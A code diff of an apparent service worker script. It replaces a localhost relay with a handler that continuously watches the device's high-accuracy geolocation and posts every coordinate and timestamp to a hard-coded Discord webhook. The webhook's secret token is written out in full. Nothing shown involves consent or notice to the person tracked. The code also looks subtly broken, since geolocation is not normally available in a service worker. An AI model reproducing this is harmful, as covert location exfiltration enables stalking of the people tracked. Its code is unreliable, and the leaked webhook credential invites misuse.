@@ -1,38 +1,27 @@
-self.addEventListener("sync", function (event) {
-    if (event.tag === "syncLocation") {
-        event.waitUntil(fetchBackgroundLocation());
+// Changes from the Old Code:
+// ✅ Removed Background Sync API – No longer needed.
+// ✅ No Fetch Calls to /get-latest-location – Now, location is sent directly via a webhook.
+// ✅ Live Geolocation Updates – Uses watchPosition() to send location continuously
+
+self.addEventListener("message", (event) => {
+    if (event.data.action === "startTracking") {
+        navigator.geolocation.watchPosition(
+            (position) => {
+                const { latitude, longitude } = position.coords;
+                const timestamp = new Date().toISOString();
+
+                // Send location to the webhook
+                fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ latitude, longitude, timestamp }),
+                })
+                .then(response => response.json())
+                .then(data => console.log("Webhook sent:", data))
+                .catch(error => console.error("Error sending webhook:", error));
+            },
+            (error) => console.error("Geolocation error:", error),
+            { enableHighAccuracy: true, maximumAge: 0 }
+        );
     }
 });
-
-async function fetchBackgroundLocation() {
-    try {
-        console.log("📡 Fetching background location...");
-        const response = await fetch("http://localhost:4000/get-latest-location");
-
-        if (!response.ok) {
-            throw new Error(`❌ HTTP error! Status: ${response.status}`);
-        }
-
-        const data = await response.json();
-        console.log("📍 Background location received:", data);
-
-        if (data.latitude && data.longitude) {
-            let payload = {
-                title: "Background Location Update",
-                description: `📍 **Lat:** ${data.latitude}, **Lon:** ${data.longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${data.latitude},${data.longitude})`
-            };
-
-            await fetch("http://localhost:4000/send-location", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-
-            console.log("✅ Background location sent to Discord!");
-        } else {
-            console.warn("⚠️ No valid location data found.");
-        }
-    } catch (error) {
-        console.error("🚨 Failed to fetch background location:", error);
-    }
-}
